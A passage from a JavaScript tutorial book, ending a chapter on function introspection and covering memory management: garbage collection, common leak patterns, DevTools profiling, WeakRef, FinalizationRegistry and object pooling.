//   source: '...',
//   body: '...',
//   comments: ['// This is a comment']
// }
```

**Dynamic Function Analysis:**

```javascript
class FunctionAnalyzer {
  static analyze(fn) {
    const source = fn.toString();
    
    return {
      identity: {
        name: fn.name || 'anonymous',
        length: fn.length
      },
      characteristics: {
        isAsync: source.includes('async'),
        isGenerator: source.includes('function*'),
        isArrow: source.includes('=>'),
        isBound: source.includes('[native code]') && fn.name.startsWith('bound'),
        isNative: source.includes('[native code]')
      },
      parameters: this.extractParams(source),
      dependencies: this.findDependencies(source),
      complexity: this.calculateComplexity(source)
    };
  }
  
  static extractParams(source) {
    const match = source.match(/\(([^)]*)\)/);
    if (!match) return [];
    
    return match[1]
      .split(',')
      .map(p => {
        p = p.trim();
        return {
          name: p.split('=')[0].replace('...', '').trim(),
          hasDefault: p.includes('='),
          isRest: p.startsWith('...')
        };
      })
      .filter(p => p.name);
  }
  
  static findDependencies(source) {
    // Find variable references (simplified)
    const matches = source.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
    const keywords = new Set([
      'function', 'return', 'if', 'else', 'for', 'while',
      'const', 'let', 'var', 'class', 'this', 'new'
    ]);
    
    return [...new Set(matches)].filter(name => !keywords.has(name));
  }
  
  static calculateComplexity(source) {
    const complexityIndicators = [
      /if\s*\(/g,
      /else/g,
      /for\s*\(/g,
      /while\s*\(/g,
      /switch\s*\(/g,
      /case\s+/g,
      /catch\s*\(/g,
      /\?\s*.*\s*:/g // Ternary
    ];
    
    let complexity = 1; // Base complexity
    
    complexityIndicators.forEach(regex => {
      const matches = source.match(regex);
      if (matches) {
        complexity += matches.length;
      }
    });
    
    return complexity;
  }
}

function complexFunction(a, b = 10) {
  if (a > 0) {
    for (let i = 0; i < b; i++) {
      if (i % 2 === 0) {
        console.log(i);
      }
    }
  } else {
    return a * b;
  }
}

console.log(FunctionAnalyzer.analyze(complexFunction));
// {
//   identity: { name: 'complexFunction', length: 1 },
//   characteristics: {
//     isAsync: false,
//     isGenerator: false,
//     isArrow: false,
//     isBound: false,
//     isNative: false
//   },
//   parameters: [
//     { name: 'a', hasDefault: false, isRest: false },
//     { name: 'b', hasDefault: true, isRest: false }
//   ],
//   dependencies: [...],
//   complexity: 4
// }
```

**Practical Use Case - Function Memoization:**

```javascript
function memoize(fn) {
  // Use function source as part of cache key
  const fnSource = fn.toString();
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args) + fnSource;
    
    if (cache.has(key)) {
      console.log(`Cache hit for ${fn.name}`);
      return cache.get(key);
    }
    
    console.log(`Computing ${fn.name}...`);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

const memoFib = memoize(fibonacci);

console.log(memoFib(10)); // Computes
console.log(memoFib(10)); // Cache hit
```

---

## Summary

This document covered Meta-programming comprehensively:

- **Property Descriptors**: Configuring object properties with `value`, `writable`, `enumerable`, and `configurable` attributes, defining properties with `Object.defineProperty`, creating immutable and hidden properties, sealed and frozen objects
- **Object Introspection**: Using `Object.getOwnPropertyNames()` and `Object.getOwnPropertySymbols()` to discover properties, understanding enumerability and its effect on iteration and object methods
- **Function Introspection**: Examining function metadata through the `name` property, understanding parameter counts with the `length` property, accessing source code with `toString()`, and building function analyzers

Meta-programming enables powerful runtime reflection and manipulation of objects and functions, allowing for advanced patterns like validation, serialization, and dynamic behavior.

---

**Related Topics to Explore Next:**

- Proxies and advanced meta-programming
- Symbol and well-known symbols
- WeakMap and WeakSet for metadata storage
- Decorators (stage 3 proposal)
- Runtime type checking and validation
---

**End of Chapter 16**


# 17-Memory-Management.md

# 17 Memory Management

---

# JavaScript Deep Dive: Memory Management


## 17.1 Garbage Collection

JavaScript uses automatic memory management through garbage collection, which periodically frees memory occupied by objects that are no longer reachable.

### Mark-and-Sweep Algorithm

Mark-and-sweep is the fundamental garbage collection algorithm used by modern JavaScript engines.

**How Mark-and-Sweep Works:**

```javascript
// Conceptual explanation of mark-and-sweep

// 1. MARK PHASE: Start from roots (global objects, local variables)
const root1 = { name: 'Root Object' };

const obj1 = { data: 'Object 1' };
const obj2 = { data: 'Object 2' };
const obj3 = { data: 'Object 3' };

root1.child = obj1;  // obj1 is reachable from root
obj1.next = obj2;    // obj2 is reachable from obj1
// obj3 is NOT referenced by anything - unreachable

// 2. SWEEP PHASE: Collect unmarked objects
// obj3 will be garbage collected because it's unreachable

// MARK-AND-SWEEP VISUALIZATION:
/*
  Roots â†’ root1 â†’ obj1 â†’ obj2
          (marked) (marked) (marked)
  
  obj3 (unmarked) â†’ COLLECTED
*/
```

**Reachability Example:**

```javascript
// Objects are reachable when referenced
let user = {
  name: 'Alice',
  address: {
    city: 'New York'
  }
};

// Both user and user.address are reachable

let admin = user; // Another reference to the same object

user = null; // Remove one reference

// Object is still reachable through 'admin'
console.log(admin.name); // 'Alice'

admin = null; // Now no references exist

// Object becomes unreachable and will be garbage collected
```

**Circular References Handled:**

```javascript
// Mark-and-sweep handles circular references correctly

function createCircular() {
  const obj1 = { name: 'Object 1' };
  const obj2 = { name: 'Object 2' };
  
  obj1.ref = obj2;  // obj1 references obj2
  obj2.ref = obj1;  // obj2 references obj1 (circular)
  
  return obj1;
}

let circular = createCircular();

// Both objects are reachable through 'circular'
console.log(circular.name); // 'Object 1'

circular = null;

// Even though obj1 and obj2 reference each other,
// they're unreachable from any root and will be collected
```

**Island of Isolation:**

```javascript
// Objects that only reference each other but are isolated

function createIsland() {
  const island1 = { name: 'Island 1' };
  const island2 = { name: 'Island 2' };
  const island3 = { name: 'Island 3' };
  
  island1.next = island2;
  island2.next = island3;
  island3.next = island1; // Creates a cycle
  
  // These objects only reference each other
  // Once function returns, no external references exist
}

createIsland();

// The entire "island" of objects is unreachable
// All three objects will be garbage collected
```

**Mark-and-Sweep Phases in Detail:**

```javascript
// Conceptual breakdown of GC phases

class GarbageCollector {
  constructor() {
    this.heap = new Set();
    this.marked = new Set();
  }
  
  // Allocate object on heap
  allocate(obj) {
    this.heap.add(obj);
    return obj;
  }
  
  // Mark phase: mark all reachable objects
  mark(roots) {
    this.marked.clear();
    const queue = [...roots];
    
    while (queue.length > 0) {
      const obj = queue.shift();
      
      if (!this.marked.has(obj)) {
        this.marked.add(obj);
        
        // Add all referenced objects to queue
        for (let prop in obj) {
          if (typeof obj[prop] === 'object' && obj[prop] !== null) {
            queue.push(obj[prop]);
          }
        }
      }
    }
  }
  
  // Sweep phase: collect unmarked objects
  sweep() {
    const collected = [];
    
    for (let obj of this.heap) {
      if (!this.marked.has(obj)) {
        this.heap.delete(obj);
        collected.push(obj);
      }
    }
    
    return collected;
  }
  
  // Full garbage collection cycle
  collect(roots) {
    this.mark(roots);
    const collected = this.sweep();
    console.log(`Collected ${collected.length} objects`);
    return collected;
  }
}

// Simulation
const gc = new GarbageCollector();

const root = gc.allocate({ name: 'root' });
const child1 = gc.allocate({ name: 'child1' });
const child2 = gc.allocate({ name: 'child2' });
const orphan = gc.allocate({ name: 'orphan' });

root.child = child1;
child1.sibling = child2;
// orphan has no references from root

gc.collect([root]); // Collects 'orphan'
```

### Reference Counting

Reference counting is an older GC technique where each object maintains a count of references to it.

**How Reference Counting Works:**

```javascript
// Conceptual explanation (not how JS actually works)

class ReferenceCountedObject {
  constructor(name) {
    this.name = name;
    this.refCount = 0;
  }
  
  addRef() {
    this.refCount++;
    console.log(`${this.name} refCount: ${this.refCount}`);
  }
  
  release() {
    this.refCount--;
    console.log(`${this.name} refCount: ${this.refCount}`);
    
    if (this.refCount === 0) {
      console.log(`${this.name} collected`);
      // Object would be freed
    }
  }
}

// Usage
const obj = new ReferenceCountedObject('MyObject');
obj.addRef(); // refCount: 1

const ref1 = obj;
obj.addRef(); // refCount: 2

const ref2 = obj;
obj.addRef(); // refCount: 3

obj.release(); // refCount: 2
ref1.release(); // refCount: 1
ref2.release(); // refCount: 0 â†’ collected
```

**Reference Counting Problem: Circular References:**

```javascript
// Reference counting fails with circular references

class Node {
  constructor(name) {
    this.name = name;
    this.refCount = 0;
    this.next = null;
  }
  
  setNext(node) {
    this.next = node;
    node.refCount++;
  }
}

// Create circular reference
const node1 = new Node('Node1');
const node2 = new Node('Node2');

node1.setNext(node2); // node2.refCount = 1
node2.setNext(node1); // node1.refCount = 1

// Even if no external references exist,
// refCount never reaches 0 due to circular references
// Objects would LEAK with pure reference counting

// This is why modern JS uses mark-and-sweep instead
```

**Why JavaScript Doesn't Use Reference Counting Alone:**

```javascript
// Demonstration of circular reference issue

function createMemoryLeak() {
  const obj1 = { name: 'Object 1' };
  const obj2 = { name: 'Object 2' };
  
  // Create circular reference
  obj1.ref = obj2;
  obj2.ref = obj1;
  
  // With reference counting alone:
  // obj1 has refCount = 1 (from obj2.ref)
  // obj2 has refCount = 1 (from obj1.ref)
  // Neither can be collected even though unreachable
  
  // With mark-and-sweep:
  // Both are unreachable from roots and will be collected
}

createMemoryLeak();
// Mark-and-sweep handles this correctly
```

### Generational Collection

Modern JavaScript engines use generational garbage collection, which optimizes collection based on object lifetime.

**Generational Hypothesis:**

```javascript
// Most objects die young
// Objects that survive become long-lived

// YOUNG GENERATION (frequently collected)
function createShortLived() {
  // These objects are created and destroyed quickly
  const temp1 = { data: new Array(1000).fill(0) };
  const temp2 = { data: 'temporary' };
  const result = temp1.data.length + temp2.data.length;
  return result;
  // temp1 and temp2 are immediately unreachable after return
}

// These objects are collected in the next minor GC
for (let i = 0; i < 1000; i++) {
  createShortLived();
}

// OLD GENERATION (infrequently collected)
const cache = new Map(); // Long-lived object

function addToCache(key, value) {
  cache.set(key, value);
  // Cache persists, promoted to old generation
}
```

**Generation Promotion:**

```javascript
// Objects that survive multiple young GC cycles
// are promoted to old generation

class LongLivedCache {
  constructor() {
    this.data = new Map();
    // This object will likely be promoted to old generation
  }
  
  set(key, value) {
    this.data.set(key, value);
  }
  
  get(key) {
    return this.data.get(key);
  }
}

const cache = new LongLivedCache();

// Short-lived objects in young generation
for (let i = 0; i < 10000; i++) {
  const temp = { id: i, data: 'temporary' };
  cache.set(temp.id, temp.data);
  // 'temp' object is short-lived
  // The data in cache is long-lived
}

// cache object is promoted to old generation
// Temporary objects are frequently collected in minor GC
```

**GC Types:**

```javascript
// MINOR GC (Scavenge)
// - Collects young generation only
// - Fast and frequent
// - Most objects collected here

function demonstrateMinorGC() {
  // Create many short-lived objects
  for (let i = 0; i < 100000; i++) {
    const temp = {
      id: i,
      data: new Array(100).fill(i),
      timestamp: Date.now()
    };
    
    // Process and discard
    const result = temp.data.reduce((a, b) => a + b, 0);
    
    // temp becomes unreachable immediately
    // Collected in next minor GC
  }
}

// MAJOR GC (Full GC)
// - Collects both young and old generations
// - Slower but less frequent
// - Only when old generation is full

const longLived = [];

function demonstrateMajorGC() {
  // Create objects that survive to old generation
  for (let i = 0; i < 10000; i++) {
    longLived.push({
      id: i,
      data: new Array(1000).fill(i)
    });
  }
  
  // These objects survive minor GCs
  // Eventually trigger major GC when old generation fills
}
```

### Memory Leaks (Common Causes)

Understanding common patterns that cause memory leaks in JavaScript.

**1. Accidental Global Variables:**

```javascript
// BAD: Creates global variable (memory leak)
function leakyFunction() {
  leakedVariable = 'I am global!'; // Missing 'var', 'let', or 'const'
  // This creates a global variable that persists
}

leakyFunction();
console.log(window.leakedVariable); // 'I am global!'

// GOOD: Use strict mode and proper declarations
'use strict';
function properFunction() {
  const properVariable = 'I am local';
  // Properly scoped, will be collected
}
```

**2. Forgotten Timers and Callbacks:**

```javascript
// BAD: Timer references keep objects alive
class LeakyWidget {
  constructor() {
    this.data = new Array(10000).fill('data');
    
    // This timer keeps the widget alive forever
    setInterval(() => {
      console.log(this.data.length);
    }, 1000);
  }
}

const widget = new LeakyWidget();
// Even if widget is no longer used, the timer keeps it alive

// GOOD: Clean up timers
class ProperWidget {
  constructor() {
    this.data = new Array(10000).fill('data');
    
    this.timer = setInterval(() => {
      console.log(this.data.length);
    }, 1000);
  }
  
  destroy() {
    clearInterval(this.timer);
    // Now widget can be garbage collected
  }
}

const properWidget = new ProperWidget();
// Later...
properWidget.destroy();
```

**3. Detached DOM Nodes:**

```javascript
// BAD: Keeping references to removed DOM nodes
const detachedNodes = [];

function createAndRemoveNode() {
  const div = document.createElement('div');
  div.className = 'my-div';
  div.innerHTML = 'Content';
  
  document.body.appendChild(div);
  
  // Store reference
  detachedNodes.push(div);
  
  // Remove from DOM
  document.body.removeChild(div);
  
  // div is detached but still referenced in array
  // Memory leak!
}

// GOOD: Don't keep references to removed nodes
function properNodeManagement() {
  const div = document.createElement('div');
  div.className = 'my-div';
  
  document.body.appendChild(div);
  
  // Use the node...
  
  document.body.removeChild(div);
  // No references kept, can be collected
}
```

**4. Closures Holding References:**

```javascript
// BAD: Closure inadvertently keeps large object alive
function createClosure() {
  const largeData = new Array(1000000).fill('data');
  const smallData = 'small';
  
  // This closure keeps entire scope alive
  return function() {
    console.log(smallData); // Only uses smallData
    // But largeData is also kept in memory!
  };
}

const leak = createClosure();
// largeData is kept alive even though not used

// GOOD: Don't capture unnecessary variables
function properClosure() {
  const largeData = new Array(1000000).fill('data');
  const smallData = 'small';
  
  // Extract only what's needed
  const needed = smallData;
  
  return function() {
    console.log(needed);
    // largeData can be collected
  };
}

// BETTER: Use block scope
function bestClosure() {
  const smallData = 'small';
  
  {
    const largeData = new Array(1000000).fill('data');
    // Use largeData here if needed
  }
  // largeData out of scope
  
  return function() {
    console.log(smallData);
  };
}
```

**5. Event Listeners Not Removed:**

```javascript
// BAD: Event listeners keep objects alive
class LeakyComponent {
  constructor(element) {
    this.element = element;
    this.data = new Array(10000).fill('data');
    
    this.element.addEventListener('click', () => {
      console.log(this.data.length);
    });
    
    // If element is removed from DOM but listener not removed,
    // entire component is kept alive
  }
}

// GOOD: Remove event listeners
class ProperComponent {
  constructor(element) {
    this.element = element;
    this.data = new Array(10000).fill('data');
    
    this.handleClick = () => {
      console.log(this.data.length);
    };
    
    this.element.addEventListener('click', this.handleClick);
  }
  
  destroy() {
    this.element.removeEventListener('click', this.handleClick);
    this.element = null;
    this.data = null;
  }
}
```

**6. Maps and Sets with Object Keys:**

```javascript
// BAD: Map with object keys prevents GC
const leakyMap = new Map();

function addToMap() {
  const key = { id: 1 };
  const value = new Array(10000).fill('data');
  
  leakyMap.set(key, value);
  
  // Even if key goes out of scope here,
  // it's kept alive by the Map
}

addToMap();
// key and value remain in memory

// GOOD: Use WeakMap for object keys
const properMap = new WeakMap();

function addToWeakMap() {
  const key = { id: 1 };
  const value = new Array(10000).fill('data');
  
  properMap.set(key, value);
  
  // When key is no longer referenced elsewhere,
  // entry is automatically removed from WeakMap
}

addToWeakMap();
// Entry can be garbage collected
```

**7. Circular References with DOM:**

```javascript
// BAD: Circular references between JS and DOM
function createCircularLeak() {
  const element = document.createElement('div');
  const data = {
    element: element,
    info: new Array(10000).fill('data')
  };
  
  // Circular reference
  element.myData = data;
  
  document.body.appendChild(element);
  
  // If element is removed but reference kept
  document.body.removeChild(element);
  
  return element;
  // element keeps data alive
  // data keeps element alive
}

// GOOD: Break circular references
function properManagement() {
  const element = document.createElement('div');
  const data = {
    info: new Array(10000).fill('data')
  };
  
  // Use WeakMap instead
  const elementData = new WeakMap();
  elementData.set(element, data);
  
  document.body.appendChild(element);
  
  // Later...
  document.body.removeChild(element);
  // No circular reference, can be collected
}
```

### Memory Profiling Tools

Using browser DevTools to find and fix memory leaks.

**Chrome DevTools Memory Profiler:**

```javascript
// Example: Finding memory leaks

class LeakyClass {
  constructor() {
    this.data = new Array(100000).fill('leak');
    
    // Leak: global reference
    window.leakyInstances = window.leakyInstances || [];
    window.leakyInstances.push(this);
  }
}

// Create many instances
for (let i = 0; i < 100; i++) {
  new LeakyClass();
}

// How to detect in Chrome DevTools:
// 1. Open DevTools â†’ Memory tab
// 2. Take Heap Snapshot
// 3. Create more instances
// 4. Take another snapshot
// 5. Compare snapshots
// 6. Look for objects that increased
// 7. Check retention path to find leak source
```

**Memory Timeline Recording:**

```javascript
// Example: Detecting growing memory

function demonstrateMemoryGrowth() {
  const leaks = [];
  
  setInterval(() => {
    // Each interval adds to array, never released
    leaks.push(new Array(10000).fill('data'));
    
    console.log('Leaks array size:', leaks.length);
  }, 100);
}

// To profile:
// 1. Open DevTools â†’ Performance tab
// 2. Check "Memory" checkbox
// 3. Click Record
// 4. Run demonstrateMemoryGrowth()
// 5. Let it run for 10-20 seconds
// 6. Stop recording
// 7. Look at Memory graph - should show steady increase
```

**Allocation Timeline:**

```javascript
// Example: Finding where allocations happen

class AllocationDemo {
  static instances = [];
  
  constructor() {
    this.largeArray = new Array(50000).fill({
      data: 'large object',
      timestamp: Date.now()
    });
    
    AllocationDemo.instances.push(this);
  }
  
  static createMany(count) {
    for (let i = 0; i < count; i++) {
      new AllocationDemo();
    }
  }
}

// To profile allocations:
// 1. DevTools â†’ Memory â†’ Allocation instrumentation timeline
// 2. Start recording
// 3. Run: AllocationDemo.createMany(100)
// 4. Stop recording
// 5. Examine which objects were allocated
// 6. Check retention paths
```

**Heap Snapshot Comparison:**

```javascript
class SnapshotDemo {
  constructor(id) {
    this.id = id;
    this.data = new Array(10000).fill(id);
  }
}

// Step 1: Take baseline snapshot
const retained = [];

// Step 2: Create objects
for (let i = 0; i < 50; i++) {
  retained.push(new SnapshotDemo(i));
}

// Step 3: Take second snapshot

// Step 4: Compare snapshots
// Look for SnapshotDemo instances
// Follow retention path: window â†’ retained â†’ SnapshotDemo

// To find leak:
// If you intended to remove these but they persist,
// the comparison shows they're still in 'retained' array
```

---

## 17.2 WeakRef

WeakRef allows holding a weak reference to an object, which doesn't prevent garbage collection.

### Creating Weak References

WeakRef creates references that don't prevent the referenced object from being collected.

**Basic WeakRef:**

```javascript
// Create object
let target = { name: 'Alice', data: new Array(10000).fill(0) };

// Create weak reference
const weakRef = new WeakRef(target);

// Can access object through deref()
console.log(weakRef.deref()?.name); // 'Alice'

// Remove strong reference
target = null;

// Object can now be garbage collected
// After GC, weakRef.deref() returns undefined
setTimeout(() => {
  const obj = weakRef.deref();
  if (obj) {
    console.log('Object still alive:', obj.name);
  } else {
    console.log('Object was collected');
  }
}, 1000);
```

**WeakRef vs Regular Reference:**

```javascript
// Regular reference prevents GC
let strongTarget = { data: 'strong' };
const strongRef = strongTarget;

strongTarget = null;
// Object still alive through strongRef

// Weak reference allows GC
let weakTarget = { data: 'weak' };
const weakReference = new WeakRef(weakTarget);

weakTarget = null;
// Object can be collected even though weakReference exists
```

### `deref()` Method

The deref() method returns the referenced object if it still exists, or undefined if it was collected.

**Using deref():**

```javascript
class Cache {
  constructor() {
    this.weakCache = new Map();
  }
  
  set(key, value) {
    // Store weak reference to value
    this.weakCache.set(key, new WeakRef(value));
  }
  
  get(key) {
    const weakRef = this.weakCache.get(key);
    if (!weakRef) return undefined;
    
    // Dereference - returns undefined if collected
    const value = weakRef.deref();
    
    if (!value) {
      // Object was collected, clean up entry
      this.weakCache.delete(key);
    }
    
    return value;
  }
  
  has(key) {
    const weakRef = this.weakCache.get(key);
    if (!weakRef) return false;
    
    const value = weakRef.deref();
    if (!value) {
      this.weakCache.delete(key);
      return false;
    }
    
    return true;
  }
}

// Usage
const cache = new Cache();

let data = { id: 1, content: 'Important data' };
cache.set('myData', data);

console.log(cache.get('myData')); // { id: 1, content: 'Important data' }

data = null; // Remove strong reference

// After GC, cache.get('myData') returns undefined
```

**Checking if Object is Still Alive:**

```javascript
function createWeakReference(obj) {
  const ref = new WeakRef(obj);
  
  return {
    deref() {
      return ref.deref();
    },
    
    isAlive() {
      return ref.deref() !== undefined;
    },
    
    withValue(callback) {
      const value = ref.deref();
      if (value) {
        return callback(value);
      }
      return null;
    }
  };
}

let target = { name: 'Test', value: 42 };
const ref = createWeakReference(target);

console.log(ref.isAlive()); // true

ref.withValue(obj => {
  console.log('Object:', obj.name);
}); // "Object: Test"

target = null;

// After GC
setTimeout(() => {
  console.log(ref.isAlive()); // false (possibly)
  
  ref.withValue(obj => {
    console.log('This might not run');
  }); // Returns null
}, 1000);
```

### Use Cases

Practical applications of WeakRef.

**1. Caching Without Memory Leaks:**

```javascript
class ImageCache {
  constructor() {
    this.cache = new Map();
  }
  
  async loadImage(url) {
    // Check cache first
    const cached = this.cache.get(url);
    if (cached) {
      const image = cached.deref();
      if (image) {
        console.log('Cache hit:', url);
        return image;
      }
      // Image was collected, remove entry
      this.cache.delete(url);
    }
    
    // Load image
    console.log('Loading:', url);
    const image = await this.fetchImage(url);
    
    // Store weak reference
    this.cache.set(url, new WeakRef(image));
    
    return image;
  }
  
  async fetchImage(url) {
    // Simulate image loading
    return {
      url,
      data: new ArrayBuffer(1024 * 1024), // 1MB
      timestamp: Date.now()
    };
  }
  
  cleanUp() {
    // Remove collected entries
    for (const [url, weakRef] of this.cache.entries()) {
      if (!weakRef.deref()) {
        this.cache.delete(url);
      }
    }
  }
}

// Usage
const imageCache = new ImageCache();

async function demo() {
  await imageCache.loadImage('/image1.jpg');
  await imageCache.loadImage('/image2.jpg');
  await imageCache.loadImage('/image1.jpg'); // Cache hit
  
  // Periodically clean up
  setInterval(() => imageCache.cleanUp(), 10000);
}
```

**2. Observer Pattern Without Memory Leaks:**

```javascript
class EventEmitter {
  constructor() {
    this.listeners = new Map();
  }
  
  on(event, listener, useWeakRef = false) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, []);
    }
    
    const entry = useWeakRef 
      ? { weak: new WeakRef(listener) }
      : { strong: listener };
    
    this.listeners.get(event).push(entry);
  }
  
  emit(event, ...args) {
    const eventListeners = this.listeners.get(event);
    if (!eventListeners) return;
    
    // Clean up collected listeners
    const active = eventListeners.filter(entry => {
      if (entry.weak) {
        const listener = entry.weak.deref();
        if (!listener) return false; // Collected
        listener(...args);
        return true;
      } else {
        entry.strong(...args);
        return true;
      }
    });
    
    this.listeners.set(event, active);
  }
  
  off(event, listener) {
    const eventListeners = this.listeners.get(event);
    if (!eventListeners) return;
    
    const filtered = eventListeners.filter(entry => {
      if (entry.weak) {
        const ref = entry.weak.deref();
        return ref !== listener;
      }
      return entry.strong !== listener;
    });
    
    this.listeners.set(event, filtered);
  }
}

// Usage
const emitter = new EventEmitter();

let handler = function(data) {
  console.log('Received:', data);
};

// Weak reference - allows handler to be collected
emitter.on('data', handler, true);

emitter.emit('data', 'Hello'); // "Received: Hello"

handler = null; // Remove strong reference

// After GC, handler is collected and won't be called
```

**3. Metadata Association:**

```javascript
class Metadata {
  constructor() {
    this.data = new Map();
  }
  
  set(object, metadata) {
    // Store weak reference to object
    const key = new WeakRef(object);
    this.data.set(key, {
      objectRef: key,
      metadata
    });
  }
  
  get(object) {
    for (const [key, value] of this.data.entries()) {
      const ref = value.objectRef.deref();
      if (ref === object) {
        return value.metadata;
      }
      if (!ref) {
        // Clean up collected object
        this.data.delete(key);
      }
    }
    return undefined;
  }
  
  cleanUp() {
    const toDelete = [];
    
    for (const [key, value] of this.data.entries()) {
      if (!value.objectRef.deref()) {
        toDelete.push(key);
      }
    }
    
    toDelete.forEach(key => this.data.delete(key));
  }
}

// Usage
const metadata = new Metadata();

let obj1 = { id: 1 };
let obj2 = { id: 2 };

metadata.set(obj1, { type: 'user', role: 'admin' });
metadata.set(obj2, { type: 'user', role: 'guest' });

console.log(metadata.get(obj1)); // { type: 'user', role: 'admin' }

obj1 = null; // Remove reference

// After GC, metadata for obj1 is automatically cleaned
```

---

## 17.3 FinalizationRegistry

FinalizationRegistry allows registering cleanup callbacks that run when objects are garbage collected.

### Registering Cleanup Callbacks

FinalizationRegistry runs callbacks when registered objects are collected.

**Basic Usage:**

```javascript
// Create registry with cleanup callback
const registry = new FinalizationRegistry((heldValue) => {
  console.log('Object collected:', heldValue);
  // Perform cleanup
});

// Register object
let target = { name: 'Alice' };
registry.register(target, 'User Alice');

// Object is tracked
// When target is collected, callback runs with 'User Alice'

target = null;

// After GC, logs: "Object collected: User Alice"
```

**Cleanup Function:**

```javascript
const cleanupRegistry = new FinalizationRegistry((resourceId) => {
  console.log(`Cleaning up resource: ${resourceId}`);
  
  // Perform actual cleanup
  closeResource(resourceId);
});

function closeResource(id) {
  console.log(`Closing resource ${id}`);
  // Close file, database connection, etc.
}

function createResource(id) {
  const resource = {
    id,
    data: new ArrayBuffer(1024 * 1024)
  };
  
  // Register for cleanup
  cleanupRegistry.register(resource, id);
  
  return resource;
}

let res1 = createResource(1);
let res2 = createResource(2);

res1 = null; // Will trigger cleanup after GC
res2 = null; // Will trigger cleanup after GC
```

**Unregistering Objects:**

```javascript
const registry = new FinalizationRegistry((value) => {
  console.log('Cleanup:', value);
});

let target = { data: 'important' };
const token = {};

// Register with unregister token
registry.register(target, 'my-object', token);

// Decide not to clean up
registry.unregister(token);

target = null;
// Cleanup callback won't run because we unregistered
```

### Use Cases (Resource Management)

**1. File Handle Cleanup:**

```javascript
class FileHandle {
  static registry = new FinalizationRegistry((fd) => {
    console.log(`Closing file descriptor ${fd}`);
    // Actually close the file
    FileHandle.closeFile(fd);
  });
  
  constructor(filename) {
    this.fd = FileHandle.openFile(filename);
    this.filename = filename;
    
    // Register for automatic cleanup
    FileHandle.registry.register(this, this.fd, this);
  }
  
  close() {
    if (this.fd !== null) {
      FileHandle.closeFile(this.fd);
      // Unregister since we manually closed
      FileHandle.registry.unregister(this);
      this.fd = null;
    }
  }
  
  static openFile(filename) {
    console.log(`Opening file: ${filename}`);
    return Math.floor(Math.random() * 10000); // Simulated FD
  }
  
  static closeFile(fd) {
    console.log(`Actually closing FD: ${fd}`);
  }
}

// Usage
let file = new FileHandle('data.txt');

// Option 1: Manual close
file.close();

// Option 2: Let GC handle it
file = null;
// File will be automatically closed when collected
```

**2. Database Connection Pool:**

```javascript
class DatabaseConnection {
  static activeConnections = new Set();
  static registry = new FinalizationRegistry((connId) => {
    console.log(`Connection ${connId} was leaked, cleaning up`);
    DatabaseConnection.forceClose(connId);
  });
  
  constructor(id) {
    this.id = id;
    this.isOpen = true;
    
    DatabaseConnection.activeConnections.add(this.id);
    DatabaseConnection.registry.register(this, this.id, this);
  }
  
  close() {
    if (this.isOpen) {
      console.log(`Properly closing connection ${this.id}`);
      DatabaseConnection.activeConnections.delete(this.id);
      DatabaseConnection.registry.unregister(this);
      this.isOpen = false;
    }
  }
  
  static forceClose(connId) {
    if (DatabaseConnection.activeConnections.has(connId)) {
      console.log(`Force closing leaked connection ${connId}`);
      DatabaseConnection.activeConnections.delete(connId);
    }
  }
}

// Usage
let conn1 = new DatabaseConnection(1);
let conn2 = new DatabaseConnection(2);

conn1.close(); // Proper cleanup
conn2 = null;  // Leak - finalization registry will clean up
```

**3. Event Listener Cleanup:**

```javascript
class ManagedEventTarget {
  static registry = new FinalizationRegistry(({ target, type, listener }) => {
    console.log(`Cleaning up forgotten listener for ${type}`);
    target.removeEventListener(type, listener);
  });
  
  constructor(element) {
    this.element = element;
    this.listeners = [];
  }
  
  addEventListener(type, listener) {
    this.element.addEventListener(type, listener);
    
    this.listeners.push({ type, listener });
    
    // Register cleanup for this specific listener
    ManagedEventTarget.registry.register(
      this,
      { target: this.element, type, listener },
      { owner: this, type, listener }
    );
  }
  
  removeEventListener(type, listener) {
    this.element.removeEventListener(type, listener);
    
    const index = this.listeners.findIndex(
      l => l.type === type && l.listener === listener
    );
    
    if (index > -1) {
      this.listeners.splice(index, 1);
      // Unregister since we manually removed
      ManagedEventTarget.registry.unregister(
        { owner: this, type, listener }
      );
    }
  }
  
  destroy() {
    // Remove all listeners
    this.listeners.forEach(({ type, listener }) => {
      this.element.removeEventListener(type, listener);
      ManagedEventTarget.registry.unregister(
        { owner: this, type, listener }
      );
    });
    this.listeners = [];
  }
}

// Usage
const button = document.createElement('button');
let manager = new ManagedEventTarget(button);

manager.addEventListener('click', () => console.log('Clicked'));

// If we forget to call destroy()
manager = null;
// Registry ensures listeners are cleaned up
```

**4. Resource Tracking:**

```javascript
class ResourceTracker {
  static resources = new Map();
  static registry = new FinalizationRegistry((resourceId) => {
    console.log(`Resource ${resourceId} leaked!`);
    ResourceTracker.logLeak(resourceId);
  });
  
  static allocate(type, size) {
    const id = Math.random().toString(36).substr(2, 9);
    const resource = {
      id,
      type,
      size,
      allocated: Date.now()
    };
    
    ResourceTracker.resources.set(id, resource);
    ResourceTracker.registry.register(resource, id, resource);
    
    return resource;
  }
  
  static release(resource) {
    if (ResourceTracker.resources.has(resource.id)) {
      console.log(`Properly released: ${resource.id}`);
      ResourceTracker.resources.delete(resource.id);
      ResourceTracker.registry.unregister(resource);
    }
  }
  
  static logLeak(resourceId) {
    const resource = ResourceTracker.resources.get(resourceId);
    if (resource) {
      console.warn('Leaked resource:', {
        id: resourceId,
        type: resource.type,
        size: resource.size,
        age: Date.now() - resource.allocated
      });
      ResourceTracker.resources.delete(resourceId);
    }
  }
  
  static getActiveResources() {
    return Array.from(ResourceTracker.resources.values());
  }
}

// Usage
let resource1 = ResourceTracker.allocate('buffer', 1024);
let resource2 = ResourceTracker.allocate('handle', 64);

ResourceTracker.release(resource1); // Proper cleanup
resource2 = null; // Leak - will be logged when collected

console.log('Active:', ResourceTracker.getActiveResources());
```

---

## 17.4 Memory Optimization

Techniques and patterns for optimizing memory usage in JavaScript applications.

### Object Pooling

Reusing objects instead of creating and destroying them repeatedly.

**Basic Object Pool:**

```javascript
class ObjectPool {
  constructor(factory, resetFn, initialSize = 10) {
    this.factory = factory;
    this.resetFn = resetFn;
    this.available = [];
    this.inUse = new Set();
    
    // Pre-allocate objects
    for (let i = 0; i < initialSize; i++) {
      this.available.push(this.factory());
    }
  }
  
  acquire() {
    let obj;
    
    if (this.available.length > 0) {
      obj = this.available.pop();
    } else {
